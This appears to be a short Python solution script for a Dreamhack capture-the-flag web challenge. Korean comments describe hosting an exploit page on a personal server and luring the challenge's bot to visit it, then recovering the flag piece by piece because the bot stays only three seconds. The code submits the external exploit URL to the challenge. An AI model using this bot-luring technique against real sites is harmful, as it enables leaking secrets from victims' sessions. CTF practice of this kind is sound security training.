# exploit.html 내용을 개인 서버에 등록한 후 봇이 해당 사이트에 접속하도록 유도
# 봇의 최대 접속 시간 3초로, 한번에 flag를 다 얻지는 못하니 얻는 대로 초기값에 추가해서 도출

import requests

port = 18184
url_index = f"http://host3.dreamhack.games:{port}/"
url_submit = url_index + "submit"

param = {"url": "https://hibrian827.github.io/static/exploit.html"}

r = requests.post(url_submit, data=param)
print(r.text)
